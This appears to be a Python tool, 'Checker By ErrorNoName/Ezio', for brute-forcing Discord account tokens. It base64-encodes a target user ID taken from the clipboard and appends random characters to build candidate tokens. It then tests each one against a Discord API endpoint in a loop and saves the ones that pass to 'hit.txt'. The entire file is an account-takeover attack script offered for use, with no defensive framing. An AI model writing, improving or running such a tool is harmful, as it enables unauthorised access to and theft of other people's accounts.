import base64
import random
import string
import requests
import sys
import os
import threading
import time
from datetime import datetime, timedelta

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.text import Text
from rich.layout import Layout
from rich.table import Table
from rich.prompt import Prompt
from rich.align import Align
from rich.live import Live
from colorama import Fore, Style, init
import keyboard  # Pour capturer les combinaisons de touches
from PIL import Image

# Initialisation de Colorama
init(autoreset=True)

# Initialisation de Rich Console
console = Console()

# Logo ASCII du logiciel
LOGO = """
 ██████╗ ██╗██████╗  ██████╗ ███████╗███████╗██████╗ 
 ██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝██╔════╝██╔══██╗
 ██████╔╝██║██████╔╝██║  ███╗█████╗  █████╗  ██████╔╝
 ██╔══██╗██║██╔══██╗██║   ██║██╔══╝  ██╔══╝  ██╔══██╗
 ██║  ██║██║██████╔╝╚██████╔╝███████╗███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
"""

# Texte sous le logo
SUBTITLE = "Checker By ErrorNoName/Ezio"

# ASCII Art de l'image (remplacez ceci par votre propre ASCII art généré)
IMAGE_ASCII = """


    #%%                   
   %@@@@@                 
 *%@@@@%@@@@@%*           
**@@@%  %:@@@@@@%%%@-.*   
%@@@#  @*...%@@%@@#+#@@@  
%@%   -+.....@%.... @@@@% 
      #-.-%%@@#...- %@@@@%
       %+...=*-+...  @@@@@
      #@@@=....:#*    @@@ 
      @@@#%@@@+           
  @    %+=%%@@@%#         
 @@@  %@@%%@@@@#=%%@#     
  =   *@@@%@@@@@@@@@+     
    %% %@%%#%+ %%%%       


"""

# Fonction pour générer un token
def generate_token(id_to_token):
    return (
        id_to_token
        + "."
        + "".join(random.choices(string.ascii_letters + string.digits, k=4))
        + "."
        + "".join(random.choices(string.ascii_letters + string.digits, k=25))
    )

# Classe pour gérer les tokens
class TokenManager:
    def __init__(self, invalid_expiry_seconds=30, max_valid=50, max_invalid=50):
        self.valid_tokens = []
        self.invalid_tokens = {}
        self.invalid_expiry = timedelta(seconds=invalid_expiry_seconds)
        self.max_valid = max_valid
        self.max_invalid = max_invalid
        self.lock = threading.Lock()

    def add_token(self, token, is_valid):
        with self.lock:
            if is_valid:
                self.valid_tokens.append(token)
                if len(self.valid_tokens) > self.max_valid:
                    self.valid_tokens.pop(0)
            else:
                self.invalid_tokens[token] = datetime.now()
                if len(self.invalid_tokens) > self.max_invalid:
                    oldest = min(self.invalid_tokens, key=self.invalid_tokens.get)
                    del self.invalid_tokens[oldest]

    def purge_invalid_tokens(self):
        with self.lock:
            current_time = datetime.now()
            tokens_to_remove = [
                token for token, timestamp in self.invalid_tokens.items()
                if current_time - timestamp > self.invalid_expiry
            ]
            for token in tokens_to_remove:
                del self.invalid_tokens[token]

    def get_valid_tokens(self):
        with self.lock:
            return list(self.valid_tokens)

    def get_invalid_tokens(self):
        with self.lock:
            return list(self.invalid_tokens.keys())

# Fonction de validation des tokens
def validate_token(token_manager, id_to_token, stop_event):
    while not stop_event.is_set():
        token = generate_token(id_to_token)
        headers = {'Authorization': token}
        try:
            response = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
            if response.status_code == 200:
                token_manager.add_token(token, is_valid=True)
            else:
                token_manager.add_token(token, is_valid=False)
        except requests.RequestException:
            # En cas d'erreur réseau, on considère le token comme invalide
            token_manager.add_token(token, is_valid=False)
        # Purger les tokens invalides anciens
        token_manager.purge_invalid_tokens()
        # Petite pause pour éviter de surcharger l'API
        time.sleep(0.1)

# Fonction pour attendre la combinaison de touches Ctrl+Shift+V
def wait_for_hotkey(hotkey, callback):
    console.print(f"\n[bold yellow]Appuyez sur [cyan]{hotkey}[/cyan] pour coller l'ID et démarrer la validation des tokens.[/bold yellow]")
    keyboard.wait(hotkey)
    callback()

# Fonction principale
def main():
    # Configuration du layout
    layout = Layout()

    layout.split_column(
        Layout(name="header", size=25),
        Layout(name="body", ratio=1),
        Layout(name="footer", size=3),
    )

    # Création du header avec le logo et l'image ASCII
    logo_text = Text(LOGO, style="bold cyan")
    subtitle_text = Text(SUBTITLE, style="bold magenta", justify="center")
    image_text = Text(IMAGE_ASCII, style="bold green")

    combined_header = Align.center(
        Text.assemble(
            logo_text,
            "\n",
            subtitle_text,
            "\n\n",
            image_text
        )
    )

    header_panel = Panel(
        combined_header,
        border_style="blue",
        padding=(1, 2)
    )
    layout["header"].update(header_panel)

    # Création du corps avec les tokens valides et invalides
    body_layout = Layout()
    body_layout.split_row(
        Layout(name="valid_tokens", ratio=1),
        Layout(name="invalid_tokens", ratio=1),
    )

    valid_panel = Panel(
        "[green]Tokens Valides[/green]",
        border_style="green",
        title_align="left"
    )
    invalid_panel = Panel(
        "[red]Tokens Invalides (se nettoient automatiquement)[/red]",
        border_style="red",
        title_align="left"
    )

    body_layout["valid_tokens"].update(valid_panel)
    body_layout["invalid_tokens"].update(invalid_panel)

    layout["body"].update(body_layout)

    # Création du footer
    footer_panel = Panel(
        "[cyan]Appuyez sur Ctrl+Shift+V pour coller l'ID et démarrer la validation des tokens.[/cyan]",
        border_style="blue"
    )
    layout["footer"].update(footer_panel)

    # Affichage initial du layout
    with Live(layout, refresh_per_second=4, screen=True):
        # Initialisation du TokenManager
        token_manager = TokenManager()

        # Événement pour arrêter la validation
        stop_event = threading.Event()

        # Fonction de callback pour démarrer la validation
        def start_validation():
            try:
                # Lire l'ID du presse-papiers
                id_input = keyboard.get_clipboard()
                console.print(f"\n[bold magenta]ID collé :[/bold magenta] {id_input}")
                encoded_id = base64.b64encode(id_input.encode("ascii")).decode("ascii")
                id_to_token = encoded_id

                # Démarrer le thread de validation des tokens
                validator_thread = threading.Thread(target=validate_token, args=(token_manager, id_to_token, stop_event))
                validator_thread.start()

                # Mettre à jour le footer pour indiquer que la validation a commencé
                layout["footer"].update(Panel(
                    "[cyan]Validation des tokens en cours... Appuyez sur Ctrl+C pour arrêter.[/cyan]",
                    border_style="blue"
                ))

                # Boucle d'affichage des tokens
                while not stop_event.is_set():
                    # Mettre à jour le tableau des tokens valides et invalides
                    valid_tokens = token_manager.get_valid_tokens()
                    invalid_tokens = token_manager.get_invalid_tokens()

                    # Création des tables
                    valid_table = Table(show_header=False, box=None)
                    for vt in valid_tokens[-20:]:  # Afficher les 20 derniers
                        valid_table.add_row(vt)

                    invalid_table = Table(show_header=False, box=None)
                    for it in invalid_tokens[-20:]:  # Afficher les 20 derniers
                        invalid_table.add_row(it)

                    # Mise à jour des panels
                    body_layout["valid_tokens"].update(
                        Panel(
                            valid_table,
                            title="[green]Tokens Valides[/green]",
                            border_style="green"
                        )
                    )

                    body_layout["invalid_tokens"].update(
                        Panel(
                            invalid_table,
                            title="[red]Tokens Invalides (se nettoient automatiquement)[/red]",
                            border_style="red"
                        )
                    )

                    # Actualiser le layout
                    layout["body"].update(body_layout)

                    time.sleep(0.5)  # Rafraîchir toutes les 0.5 secondes

            except Exception as e:
                console.print(f"[red]Erreur lors de la validation des tokens : {e}[/red]")
                stop_event.set()

        # Démarrage du thread d'attente de la combinaison de touches
        threading.Thread(target=wait_for_hotkey, args=("ctrl+shift+v", start_validation), daemon=True).start()

        try:
            while not stop_event.is_set():
                time.sleep(0.1)
        except KeyboardInterrupt:
            # Interruption par l'utilisateur
            stop_event.set()
            console.print("\n[yellow]Validation interrompue par l'utilisateur[/yellow]\n")

            # Option pour sauvegarder les tokens valides
            save_option = Prompt.ask("[yellow]Voulez-vous enregistrer les tokens valides dans un fichier ? (oui/non)[/yellow]", choices=["oui", "non"])
            if save_option.lower() == "oui":
                try:
                    with open("hit.txt", "w") as file:
                        for vt in token_manager.get_valid_tokens():
                            file.write(f"{vt}\n")
                    console.print("[green]Tokens valides enregistrés dans 'hit.txt'[/green]")
                except Exception as e:
                    console.print(f"[red]Erreur lors de l'enregistrement des tokens : {e}[/red]")

            console.print("[cyan]Au revoir ![/cyan]")
            sys.exit()

# Exécution du programme
if __name__ == "__main__":
    main()
